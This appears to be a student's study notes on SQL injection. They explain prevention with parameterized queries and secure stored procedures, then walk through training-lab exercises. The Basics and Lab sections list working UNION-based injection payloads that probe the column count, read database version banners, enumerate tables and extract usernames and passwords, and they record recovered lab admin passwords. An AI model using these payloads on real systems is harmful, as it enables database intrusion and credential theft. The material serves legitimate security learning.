A vulnerability that allows attacker to manipulates the database query by injecting malicious inputs and giving unintended output.
![[file-20250501230922793.png]]
`In-band` means the attacker uses the same communication channel to both launch the attack and gather the results of the attacks. 
`Inferential` means that there is no actual transfer of data via the web application. 
`OAST` techniques involve triggering out-of-band network connection to a system that you control. We can also make use of protocols like DNS, HTTP (Burp collaborator)
## Detection
-  Using single quote `'` to get errors.
-  Some Boolean or time-based delays.
- OAST to trigger an out-of-band network interactions.
## Preventions
- Use *prepared* statements(*Parametrized queries*): **In Parameterized Code** The database receives a query structure: `SELECT * FROM users WHERE username = ?`. The database separately receives the parameter value: `' OR '1'='1`. When the query executes, the database treats the entire input as a single string literal. The resulting query effectively becomes: `SELECT * FROM users WHERE username = '\' OR \'1\'=\'1'`. The database looks for a username that is literally the string `' OR '1'='1`, which doesn't exist.
**Behind the Scenes**
When `bindParam()` or `bind_param()` is called:
1. The database driver converts special characters in the user input into their escaped forms
2. The database engine recognizes the placeholder as a parameter position, not as part of the SQL syntax
3. During execution, the database substitutes the parameter value in a way that preserves the original query structure
4. The entire input is treated as a single atomic value within the SQL statement's structure
```php
<?php // VULNERABLE CODE (for comparison) 
function vulnerable_query($conn, $username) { 
	// DANGEROUS: Directly inserts user input into query string 
	$query = "SELECT * FROM users WHERE username = '$username'"; 
	// If username = "' OR '1'='1", this becomes: 
	// SELECT * FROM users WHERE username = '' OR '1'='1' 
	return $conn->query($query); 
} 
// SAFE CODE - PHP DATA OBJECTS VERSION 
function safe_query_pdo($conn, $username) { 
	// 1. Create query template with named placeholder 
	$stmt = $conn->prepare("SELECT * FROM users WHERE username = :username");
	// 2. Bind the parameter - this is where SQL injection is prevented 
	$stmt->bindParam(':username', $username, PDO::PARAM_STR); 
	// The parameter is now treated as a literal string value, 
	// not as executable SQL code, regardless of what characters it contains 
	// 3. Execute with bound parameters 
	$stmt->execute(); 
	// 4. Return results return 
	$stmt->fetchAll(PDO::FETCH_ASSOC); 
} // SAFE CODE - MYSQLI VERSION 
function safe_query_mysqli($conn, $username) { 
	// 1. Create query template with ? placeholder 
	$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?"); 
	// 2. Bind parameter with type information 
	// 's' specifies the parameter is a string 
	$stmt->bind_param("s", $username); 
	// The binding process ensures special characters are escaped properly 
	// and the entire value is treated as a single parameter 
	// 3. Execute safely 
	$stmt->execute(); 
	// 4. Get and return results 
	$result = $stmt->get_result(); return $result->fetch_all(MYSQLI_ASSOC); 
} 
?>
```

- Whitelist Input *Validation*
- *Escaping* user supplied input.
- Use of *stored procedures*(A stored procedure in SQL is a set of precompiled SQL statements that can be executed as a single unit to perform specific tasks, such as querying or modifying data). 
**Microsoft SQL Server**
Microsoft SQL Server provides a built-in procedure named _sp_executesql_ which can take parameterized variables. For security and performance reasons **you should always use _sp_executesql_ instead of _EXEC/EXECUTE_** when working with Transact-SQL.

```SQL
Secure Microsoft SQL Server stored procedures.

CREATE PROC secure (@v_sp_param VARCHAR(1000))
AS
   DECLARE @vsql NVARCHAR(4000)
   DECLARE @vparamdefinition NVARCHAR(500)
   SET @vsql = N'SELECT description FROM products WHERE name = @val'
   SET @vparamdefinition = N'@val VARCHAR(1000)'
   EXECUTE sp_executesql @vsql, @vparamdefinition, @val = @v_sp_param
GO
```

Be careful not to misuse _sp_executesql_ however. If you simply supply it a concatenated string with no parameter definition **you will not fix your security problem**.
Let’s now take a look at the equivalent with **MySQL's** syntax.

```mysql
Writing secure MySQL stored procedure.

CREATE PROCEDURE secure (IN param VARCHAR(1000))
BEGIN
   PREPARE stmt FROM 'SELECT description FROM products where name=?';
   SET @name = param;
   EXECUTE stmt USING @name;
   DEALLOCATE PREPARE stmt;
END
```

Here again, this procedure is immunized against SQL injection.
**Avoid String Concatenation**
Another efficient way to prevent SQL injection is to avoid executing queries stored in strings. Queries integrated as batch commands into a stored procedure are treated like implicit prepared statements. The following example uses Microsoft SQL Server syntax but it could easily be adapted to any DBMS.

```sql
Safely using user supply parameter in stored procedures.
CREATE PROCEDURE nostring (@vname varchar(1000))
AS
   DELETE FROM products WHERE name = @vname
GO
```
In the last stored procedure, no SQL injection is possible and when it gets executed only products that exactly match the parameter will be deleted.
- Enforcing PoLP( principle of least privilege )
## Basics
A Simple MySQL query for the request URL from the browser `https://insecure-website.com/products?category=Gifts` goes like:

```SQL
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

The above statement uses the `released = 1` parameter to hide the unwanted results. However the attackers can manipulate this since the user input category is `user-controlled`.
So, if the attacker enters something like `Gifts'--` in the URL then whole query becomes:
```SQL
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

> **WARNING**
>Take care when injecting the condition `OR 1=1` into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an `UPDATE` or `DELETE` statement, for example, it can result in an accidental loss of data.

> **How Evaluation works in SQL?**
>In programming languages that use short-circuit evaluation (like JavaScript, Python, etc.), OR operations can indeed skip evaluating the second condition if the first one is already true.
>However, SQL doesn't use `short-circuit` evaluation for OR conditions in the same way. SQL is a `declarative` language designed for `set-based` operations rather than `procedural` execution.

> **Rules of UNION operator**
> The number and the order of the columns must be the same in all queries and the datatype must be compatible.

```SQL
'+OR+1=1--
valid_user'--
```
### Methodology for UNION based injection
- Find the number of columns that the query is making.
- Find the datatype of the columns.
-  Use the UNION operator to output the data.

You can use `ORDER BY` clause to exploit `UNION-based` injection:
- Incrementally inject a series of ORDER BY clauses to get error
```SQL
ORDER BY 1--
ORDER BY 2--
ORDER BY 3-- 
```

You can use `NULL VALUES` to determine the number of columns required.
- Incrementally inject a series of `UNION SELECT` payloads specifying a different number of `NULL` values till you get error.
```SQL
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```

So now for exploitation, we need to find a column where we can input useful data. (Exam assumes the table has 2 columns)
```SQL
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
```

Now to find a certain string from the database using UNION SQL query and output we first need to find the total number of tables using `NULL` and then we find which field has SQL Injection and then we use `SUBSTRING` to retrieve the string like so:

```mysql
' UNION SELECT NULL,'t2opRm',NULL--
```

### Lab: Examining the database
**SQL injection attack, querying the database type and version on `Oracle`**
On Oracle databases, every `SELECT` statement must specify a table to select `FROM`. If your `UNION SELECT` attack does not query from a table, you will still need to include the `FROM` keyword followed by a valid table name.

```sql
' ORDER BY 2--
' UNION SELECT 'a',NULL FROM dual--
' UNION SELECT NULL,'b' FROM dual--
' UNION SELECT 'a','b' FROM dual--
' UNION SELECT NULL,banner FROM v$version--
' UNION SELECT banner,NULL FROM v$version--
```

**SQL injection attack, querying the database type and version on `MySQL and Microsoft`**

```sql
'+UNION+SELECT+@@version,+NULL-- -
```

**SQL injection attack, listing the database contents on `non-Oracle` databases**

```sql
' UNION SELECT 'a','b'--
' UNION SELECT table_name, NULL FROM information_schema.tables--
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_omtxik'--
' UNION SELECT username_llejoc,password_jyahrx FROM users_omtxik--
```

![[file-20250504200626167.png]]
![[file-20250504201208507.png]]
![[file-20250504202146969.png]]

**SQL injection attack, listing the database contents on `Oracle`**
[Database Reference: ALL_TABLES](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TABLES.html)
[Database Reference: ALL_TAB_COLUMNS](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TAB_COLUMNS.html)
```sql
' UNION SELECT 'a','b' FROM dual--
' UNION SELECT owner,table_name FROM all_tables--
' UNION SELECT COLUMN_NAME,NULL FROM all_tab_columns WHERE table_name = 'USERS_LBAQSE'--
' UNION SELECT COLUMN_NAME,NULL FROM all_tab_columns WHERE table_name = 'USERS_LBAQSE'--
' UNION SELECT USERNAME_XOSEQK,PASSWORD_RRBRZM FROM USERS_LBAQSE--
```

![[file-20250504220551352.png]]
![[file-20250504221151843.png]]
![[file-20250504221454878.png]]
### Lab: SQL injection UNION attack, retrieving data from other tables

Find the number of rows first using ORDER BY  or NULL. Then confirm the datatype by entering gibberish in each row and we know it is string since both returned `200 OK`. Then write your `SQL query` to retrieve the data from the table.

```SQL
'+ORDER+BY+2--
'+UNION+SELECT+'a',NULL--
'+UNION+SELECT+NULL,'a'--
'+UNION+SELECT+username,password+FROM+users--
```

![[file-20250503191549040.png]]
Now login with the administrator and `b03dpneem5463zdxohts` to complete the challenge.

### Lab: SQL injection UNION attack, retrieving multiple values in a single column
Now we are supposed to print both multiple columns in a single column. So we first need to know which column to fetch the values into:
```SQL
' ORDER BY 1,2--
' UNION SELECT 1,'something'--
' UNION SELECT 1,username||password from users--
```
Now to separate the username and the password we can use the below payload and for concatenation use the `||` operator:
```sql
' UNION SELECT 1,username||':'||password from users--
```

![[file-20250503201458011.png]]
And now login with the `administrator` and `h1jndyjfop9zvggptkdw`
## Blind SQLi
Blind SQL injection occurs when an application is vulnerable to SQL injection, but its `HTTP responses` do not contain the results of the relevant SQL query or the details of any database errors.
### Exploiting blind SQL injection by triggering conditional responses

## Resources
- [GitHub - rkhal101/Web-Security-Academy-Series](https://github.com/rkhal101/Web-Security-Academy-Series)